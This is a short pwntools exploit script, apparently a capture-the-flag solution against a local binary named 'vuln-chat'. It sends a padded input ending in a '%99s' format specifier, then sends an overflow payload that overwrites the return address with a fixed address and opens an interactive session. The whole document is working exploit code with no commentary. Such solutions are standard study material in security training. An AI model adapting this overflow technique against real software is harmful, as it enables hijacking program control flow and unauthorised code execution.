from pwn import *

p = process('./vuln-chat')

addr = 0x804856b

payload1 = "A" * 20
payload1 += "%99s"

p.sendline(payload1)

payload2 = b"B" * 0x31
payload2 += p32(addr)

p.sendline(payload2)

p.interactive()
